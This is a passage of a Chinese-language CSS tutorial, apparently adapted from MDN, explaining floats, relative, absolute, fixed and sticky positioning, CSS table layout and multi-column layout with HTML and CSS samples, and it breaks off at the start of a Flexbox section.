class="hljs applescript">&lt;h1&gt;Simple float example&lt;/h1&gt;<br><br>&lt;<span class="hljs-keyword">div</span> <span class="hljs-built_in">class</span>=<span class="hljs-string">&quot;box&quot;</span>&gt;Float&lt;/<span class="hljs-keyword">div</span>&gt;<br><br>&lt;p&gt; Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla luctus aliquam dolor, eu lacinia lorem placerat vulputate. Duis felis orci, pulvinar <span class="hljs-built_in">id</span> metus ut, rutrum luctus orci. Cras porttitor imperdiet nunc, <span class="hljs-keyword">at</span> ultricies tellus laoreet sit amet. Sed auctor cursus massa <span class="hljs-keyword">at</span> porta. Integer ligula ipsum, tristique sit amet orci vel, viverra egestas ligula. Curabitur vehicula tellus neque, ac ornare ex malesuada et. In vitae convallis lacus. Aliquam erat volutpat. Suspendisse ac imperdiet turpis. Aenean finibus sollicitudin eros pharetra congue. Duis ornare egestas augue ut luctus. Proin blandit quam nec lacus varius commodo et a urna. Ut <span class="hljs-built_in">id</span> ornare felis, eget fermentum sapien.&lt;/p&gt;<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.box</span> &#123;<br>    <span class="hljs-attribute">float</span>: left;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">150px</span>;<br>    <span class="hljs-attribute">height</span>: <span class="hljs-number">150px</span>;<br>    <span class="hljs-attribute">margin-right</span>: <span class="hljs-number">30px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><iframe class="sample-code-frame" title="浮动 sample" id="frame_浮动" width="100%" height="600" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/CSS_layout/Introduction/_sample_.%E6%B5%AE%E5%8A%A8.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><p><strong>备注：</strong> CSS 浮动的知识会在我们关于 <a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS/CSS_layout/Floats">浮动</a>的教程当中被详细地解释。除此之外，如果您想要了解在 Flexbox 和 Grid 布局出现之前我们是如何进行列布局的（仍然有可能碰到这种情形），请阅读我们关于<a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS/CSS_layout/Legacy_Layout_Methods">传统布局方式</a>的文章。</p><h4 id="定位技术"><a href="#定位技术" class="headerlink" title="定位技术"></a>定位技术</h4><p>定位 (positioning) 能够让我们把一个元素从它原本在正常布局流 (normal flow) 中应该在的位置移动到另一个位置。定位 (positioning) 并不是一种用来给你做主要页面布局的方式，它更像是让你去管理和微调页面中的一个特殊项的位置。</p><p>有一些非常有用的技术在特定的布局下依赖于<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/position"><code>position</code></a>属性。同时，理解定位 (positioning) 也能够帮助你理解正常布局流 (normal flow)，理解把一个元素移出正常布局流 (normal flow) 是怎么一回事。</p><p>有五种主要的定位类型需要我们了解：</p><ul><li><strong>静态定位</strong>（Static positioning）是每个元素默认的属性——它表示“将元素放在文档布局流的默认位置——没有什么特殊的地方”。</li><li><strong>相对定位</strong>（Relative positioning）允许我们相对于元素在正常的文档流中的位置移动它——包括将两个元素叠放在页面上。这对于微调和精准设计（design pinpointing）非常有用。</li><li><strong>绝对定位</strong>（Absolute positioning）将元素完全从页面的正常布局流（normal layout flow）中移出，类似将它单独放在一个图层中。我们可以将元素相对于页面的 <code>&lt;html&gt;</code> 元素边缘固定，或者相对于该元素的<em>最近被定位祖先元素</em>（nearest positioned ancestor element）。绝对定位在创建复杂布局效果时非常有用，例如通过标签显示和隐藏的内容面板或者通过按钮控制滑动到屏幕中的信息面板。</li><li><strong>固定定位</strong>（Fixed positioning）与绝对定位非常类似，但是它是将一个元素相对浏览器视口固定，而不是相对另外一个元素。这在创建类似在整个页面滚动过程中总是处于屏幕的某个位置的导航菜单时非常有用。</li><li><strong>粘性定位</strong>（Sticky positioning）是一种新的定位方式，它会让元素先保持和 <code>position: static</code> 一样的定位，当它的相对视口位置（offset from the viewport）达到某一个预设值时，它就会像 <code>position: fixed</code> 一样定位。</li></ul><h4 id="简单定位示例"><a href="#简单定位示例" class="headerlink" title="简单定位示例"></a>简单定位示例</h4><p>我们将展示一些示例代码来熟悉这些布局技术。这些示例代码都作用在下面这一个相同的 HTML 上：</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pf"><span class="hljs-variable">&lt;h1&gt;</span>Positioning&lt;/h1&gt;<br><br><span class="hljs-variable">&lt;p&gt;</span>I am a <span class="hljs-keyword">basic</span> <span class="hljs-built_in">block</span> level element.&lt;/p&gt;<br><span class="hljs-variable">&lt;p class=&quot;positioned&quot;&gt;</span>I am a <span class="hljs-keyword">basic</span> <span class="hljs-built_in">block</span> level element.&lt;/p&gt;<br><span class="hljs-variable">&lt;p&gt;</span>I am a <span class="hljs-keyword">basic</span> <span class="hljs-built_in">block</span> level element.&lt;/p&gt;<br></code></pre></td></tr></table></figure><p>该 HTML 将使用以下 CSS 默认样式：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span> &#123;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">500px</span>;<br>  <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;<br>&#125;<br><br><span class="hljs-selector-tag">p</span> &#123;<br>    <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">rgb</span>(<span class="hljs-number">207</span>,<span class="hljs-number">232</span>,<span class="hljs-number">220</span>);<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">2px</span> solid <span class="hljs-built_in">rgb</span>(<span class="hljs-number">79</span>,<span class="hljs-number">185</span>,<span class="hljs-number">227</span>);<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">10px</span>;<br>    <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">5px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>渲染效果如下：</p><iframe class="sample-code-frame" title="简单定位示例 sample" id="frame_简单定位示例" width="100%" height="300" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/CSS_layout/Introduction/_sample_.%E7%AE%80%E5%8D%95%E5%AE%9A%E4%BD%8D%E7%A4%BA%E4%BE%8B.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><h4 id="相对定位"><a href="#相对定位" class="headerlink" title="相对定位"></a>相对定位</h4><p>相对定位 (relative positioning) 让你能够把一个正常布局流 (normal flow) 中的元素从它的默认位置按坐标进行相对移动。比如将一个图标往下调一点，以便放置文字。我们可以通过下面的规则添加相对定位来实现效果：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.positioned</span> &#123;<br>  <span class="hljs-attribute">position</span>: relative;<br>  <span class="hljs-attribute">top</span>: <span class="hljs-number">30px</span>;<br>  <span class="hljs-attribute">left</span>: <span class="hljs-number">30px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里我们给中间段落的<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/position"><code>position</code></a> 一个 <code>relative</code>值——这属性本身不做任何事情，所以我们还添加了<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/top"><code>top</code></a>和<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/left"><code>left</code></a>属性。这些可以将受影响的元素向下向右移——这可能看起来和你所期待的相反，但你需要把它看成是左边和顶部的元素被“推开”一定距离，这就导致了它的向下向右移动。</p><p>添加此代码将给出以下结果：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.positioned</span> &#123;<br>  <span class="hljs-attribute">position</span>: relative;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>,<span class="hljs-number">84</span>,<span class="hljs-number">104</span>,.<span class="hljs-number">3</span>);<br>  <span class="hljs-attribute">border</span>: <span class="hljs-number">2px</span> solid <span class="hljs-built_in">rgb</span>(<span class="hljs-number">255</span>,<span class="hljs-number">84</span>,<span class="hljs-number">104</span>);<br>  <span class="hljs-attribute">top</span>: <span class="hljs-number">30px</span>;<br>  <span class="hljs-attribute">left</span>: <span class="hljs-number">30px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><iframe class="sample-code-frame" title="相对定位 sample" id="frame_相对定位" width="100%" height="300" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/CSS_layout/Introduction/_sample_.%E7%9B%B8%E5%AF%B9%E5%AE%9A%E4%BD%8D.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><h4 id="绝对定位"><a href="#绝对定位" class="headerlink" title="绝对定位"></a>绝对定位</h4><p>绝对定位用于将元素移出正常布局流 (normal flow)，以坐标的形式相对于它的容器定位到 web 页面的任何位置，以创建复杂的布局。有趣的是，它经常被用于与相对定位和浮动的协同工作。</p><p>回到我们最初的非定位示例，我们可以添加以下的 CSS 规则来实现绝对定位：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.positioned</span> &#123;<br>  <span class="hljs-attribute">position</span>: absolute;<br>  <span class="hljs-attribute">top</span>: <span class="hljs-number">30px</span>;<br>  <span class="hljs-attribute">left</span>: <span class="hljs-number">30px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里我们给我们的中间段一个<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/position"><code>position</code></a>的 <code>absolute</code>值，并且和前面一样加上 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/top"><code>top</code></a> 和<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/left"><code>left</code></a> 属性。但是，添加此代码将给出以下结果：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.positioned</span> &#123;<br>    <span class="hljs-attribute">position</span>: absolute;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>,<span class="hljs-number">84</span>,<span class="hljs-number">104</span>,.<span class="hljs-number">3</span>);<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">2px</span> solid <span class="hljs-built_in">rgb</span>(<span class="hljs-number">255</span>,<span class="hljs-number">84</span>,<span class="hljs-number">104</span>);<br>    <span class="hljs-attribute">top</span>: <span class="hljs-number">30px</span>;<br>    <span class="hljs-attribute">left</span>: <span class="hljs-number">30px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><iframe class="sample-code-frame" title="绝对定位 sample" id="frame_绝对定位" width="100%" height="300" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/CSS_layout/Introduction/_sample_.%E7%BB%9D%E5%AF%B9%E5%AE%9A%E4%BD%8D.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><p>这和之前截然不同！定位元素现在已经与页面布局的其余部分完全分离，并位于页面的顶部。其他两段现在靠在一起，好像之前那个中间段落不存在一样。<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/top"><code>top</code></a>和<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/left"><code>left</code></a>属性对绝对位置元素的影响不同于相对位置元素。在这一案例当中，他们没有指定元素相对于原始位置的移动程度。相反，在这一案例当中，它们指定元素应该从页面边界的顶部和左边的距离 (确切地说，是 <code>&lt;html&gt;</code>元素的距离)。我们也可以修改作为容器的那个元素（在这里是<code>&lt;html&gt;</code>元素），要了解这方面的知识，参见关于<a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS/CSS_layout/Positioning">定位 (positioning)</a>的课程</p><p>我们现在暂时不讨论固定定位（fixed positioning）——它基本上以相同的方式工作，除了它仍然固定在浏览器窗口的边缘，而不是它定位的父节点的边缘。</p><h4 id="固定定位"><a href="#固定定位" class="headerlink" title="固定定位"></a>固定定位</h4><p>固定定位 (fixed positioning) 同绝对定位 (absolute positioning) 一样，将元素从文档流 (document flow) 当中移出了。但是，定位的坐标不会应用于”容器”边框来计算元素的位置，而是会应用于视口 (viewport) 边框。利用这一特性，我们可以轻松搞出一个固定位置的菜单，而不受底下的页面滚动的影响。</p><p>在这个例子里面，我们在 HTML 加了三段很长的文本来使得页面可滚动，又加了一个带有<code>position: fixed</code>的盒子。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Fixed positioning<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;positioned&quot;</span>&gt;</span>Fixed<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Paragraph 1.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Paragraph 2.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Paragraph 3.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.positioned</span> &#123;<br>    <span class="hljs-attribute">position</span>: fixed;<br>    <span class="hljs-attribute">top</span>: <span class="hljs-number">30px</span>;<br>    <span class="hljs-attribute">left</span>: <span class="hljs-number">30px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><iframe class="sample-code-frame" title="固定定位 sample" id="frame_固定定位" width="100%" height="200" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/CSS_layout/Introduction/_sample_.%E5%9B%BA%E5%AE%9A%E5%AE%9A%E4%BD%8D.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><h4 id="粘性定位"><a href="#粘性定位" class="headerlink" title="粘性定位"></a>粘性定位</h4><p>粘性定位 (sticky positioning) 是最后一种我们能够使用的定位方式。它将默认的静态定位 (static positioning) 和固定定位 (fixed positioning) 相混合。当一个元素被指定了<code>position: sticky</code>时，它会在正常布局流中滚动，直到它出现在了我们给它设定的相对于容器的位置，这时候它就会停止随滚动移动，就像它被应用了<code>position: fixed</code>一样。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.positioned</span> &#123;<br>  <span class="hljs-attribute">position</span>: sticky;<br>  <span class="hljs-attribute">top</span>: <span class="hljs-number">30px</span>;<br>  <span class="hljs-attribute">left</span>: <span class="hljs-number">30px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><iframe class="sample-code-frame" title="粘性定位 sample" id="frame_粘性定位" width="100%" height="200" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/CSS_layout/Introduction/_sample_.%E7%B2%98%E6%80%A7%E5%AE%9A%E4%BD%8D.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><p><strong>备注：</strong> 想要发现更多关于定位的信息，请参阅我们的<a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS/CSS_layout/Positioning">Positioning</a>和<a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS/CSS_layout/Practical_positioning_examples">Practical positioning examples</a>文章。</p><h4 id="表格布局"><a href="#表格布局" class="headerlink" title="表格布局"></a>表格布局</h4><p>HTML 表格对于显示表格数据是很好的，但是很多年前——在浏览器中支持基本的 CSS 之前——web 开发人员过去也常常使用表格来完成整个网页布局——将它们的页眉、页脚、不同的列等等放在不同的表行和列中。这在当时是有效的，但它有很多问题——表布局是不灵活的，繁重的标记，难以调试和语义上的错误（比如，屏幕阅读器用户在导航表布局方面有问题）。</p><p>一个<code>&lt;table&gt;</code>标签之所以能够像表格那样展示，是由于 css 默认给<code>&lt;table&gt;</code>标签设置了一组 table 布局属性。当这些属性被应用于排列非<code>&lt;table&gt;</code>元素时，这种用法被称为“使用 CSS 表格”。</p><p>下面这个例子展示了一个这样的用法。使用 CSS 表格来进行布局，在现在这个时间点应该被认为是一种传统方法，它通常会被用于兼容一些不支持 Flexbox 和 Grid 的浏览器。</p><p>让我们来看一个例子。首先，创建 HTML 表单的一些简单标记。每个输入元素都有一个标签，我们还在一个段落中包含了一个标题。为了进行布局，每个标签&#x2F;输入对都封装在<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/div"><code>&lt;div&gt;</code></a>中。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>First of all, tell us your name and age.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;fname&quot;</span>&gt;</span>First name:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;fname&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;lname&quot;</span>&gt;</span>Last name:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;lname&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;age&quot;</span>&gt;</span>Age:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;age&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p>现在，我们例子中的 CSS。除了使用 display 属性外，大多数 CSS 都是相当普通的。 <code>&lt;form&gt;</code>,<code> &lt;div&gt;</code>, <code>&lt;label&gt;</code>和<code>&lt;input&gt;</code>被告知要分别显示表、表行和表单元——基本上，它们会像 HTML 表格标记一样，导致标签和输入在默认情况下排列整齐。我们所要做的就是添加一些大小、边缘等等，让一切看起来都好一点，我们就完成了。</p><p>你会注意到标题段落已经给出了 display: table-caption;——这使得它看起来就像一个表格<code>&lt;caption&gt;</code> ——同时出于设计需要，我们通过caption-side: bottom; 告诉标题应该展示在表格的底部，即使这个<code>&lt;p&gt;</code>标记在源码中是在<code>&lt;input&gt;</code>之前。这就能让你有一点灵活的弹性。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">html</span> &#123;<br>  <span class="hljs-attribute">font-family</span>: sans-serif;<br>&#125;<br><br><span class="hljs-selector-tag">form</span> &#123;<br>  <span class="hljs-attribute">display</span>: table;<br>  <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;<br>&#125;<br><br><span class="hljs-selector-tag">form</span> <span class="hljs-selector-tag">div</span> &#123;<br>  <span class="hljs-attribute">display</span>: table-row;<br>&#125;<br><br><span class="hljs-selector-tag">form</span> <span class="hljs-selector-tag">label</span>, <span class="hljs-selector-tag">form</span> <span class="hljs-selector-tag">input</span> &#123;<br>  <span class="hljs-attribute">display</span>: table-cell;<br>  <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">10px</span>;<br>&#125;<br><br><span class="hljs-selector-tag">form</span> <span class="hljs-selector-tag">label</span> &#123;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;<br>  <span class="hljs-attribute">padding-right</span>: <span class="hljs-number">5%</span>;<br>  <span class="hljs-attribute">text-align</span>: right;<br>&#125;<br><br><span class="hljs-selector-tag">form</span> <span class="hljs-selector-tag">input</span> &#123;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">300px</span>;<br>&#125;<br><br><span class="hljs-selector-tag">form</span> <span class="hljs-selector-tag">p</span> &#123;<br>  <span class="hljs-attribute">display</span>: table-caption;<br>  <span class="hljs-attribute">caption-side</span>: bottom;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">300px</span>;<br>  <span class="hljs-attribute">color</span>: <span class="hljs-number">#999</span>;<br>  <span class="hljs-attribute">font-style</span>: italic;<br>&#125;<br></code></pre></td></tr></table></figure><p>结果如下：</p><iframe class="sample-code-frame" title="表格布局 sample" id="frame_表格布局" width="100%" height="170" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/CSS_layout/Introduction/_sample_.%E8%A1%A8%E6%A0%BC%E5%B8%83%E5%B1%80.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><p>你可以在 <a href="https://mdn.github.io/learning-area/css/styling-boxes/box-model-recap/css-tables-example.html">css-tables-example.html</a> 看到预览版 (也可以见<a href="https://github.com/mdn/learning-area/blob/master/css/styling-boxes/box-model-recap/css-tables-example.html">源码</a>)</p><h4 id="多列布局"><a href="#多列布局" class="headerlink" title="多列布局"></a>多列布局</h4><p>多列布局模组给了我们 一种把内容按列排序的方式，就像文本在报纸上排列那样。由于在 web 内容里让你的用户在一个列上通过上下滚动来阅读两篇相关的文本是一种非常低效的方式，那么把内容排列成多列可能是一种有用的技术。</p><p>要把一个块转变成多列容器 (multicol container)，我们可以使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/column-count"><code>column-count</code></a>属性来告诉浏览器我们需要多少列，也可以使用<a href="https://developer.mozilla.org/en-US/docs/Web/CSS/column-width"><code>column-width</code> (en-US)</a>来告诉浏览器以至少某个宽度的尽可能多的列来填充容器。</p><p>在下面这个例子中，我们从一个 class 为<code>container</code>的<code>&lt;div&gt;</code>容器元素里边的一块 HTML 开始。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Multi-column layout<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Paragraph 1.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Paragraph 2.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>我们指定了该容器的<code>column-width</code>为 200 像素，这让浏览器创建了尽可能多的 200 像素的列来填充这一容器。接着他们共同使用剩余的空间来伸展自己的宽度。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;<br>    <span class="hljs-attribute">column-width</span>: <span class="hljs-number">200px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><iframe class="sample-code-frame" title="多列布局 sample" id="frame_多列布局" width="100%" height="200" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/CSS_layout/Introduction/_sample_.%E5%A4%9A%E5%88%97%E5%B8%83%E5%B1%80.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><h3 id="2-14-弹性盒子"><a href="#2-14-弹性盒子" class="headerlink" title="2.14 弹性盒子"></a>2.14 弹性盒子</h3><p>我们给的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/display"><code>display</code></a> 值为 <code>flex</code> 的元素就像一个块级元素，但是它的子元素布局为 flex 项。下个部分将更详细地描述这些意味着什么。请注意，如果你希望该元素的子元素作为 flex 项，你也可以使用 <code>display</code> 值为 <code>inline-flex</code>，但是该元素的行为类似于行内元素。</p><h4 id="flex-模型说明"><a href="#flex-模型说明" class="headerlink" title="flex 模型说明"></a>flex 模型说明</h4><p>当元素表现为 flex 框时，它们沿着两个轴来布局：</p><p><img src="https://developer.mozilla.org/en-US/docs/Learn/CSS/CSS_layout/Flexbox/flex_terms.png" alt="在从左到右的语言中，三个 flex 项并排放置在 flex 容器中。主轴——弹性容器布置 flex 方向上的轴——是水平的。主轴的两端是开始端和结束端，分别位于左侧和右侧。交叉轴是垂直的；垂直于主轴。交叉轴的开始端和结束端分别位于顶部和底部。flex 项沿着主轴排列，在这种情况下，宽度称为主轴尺寸，flex 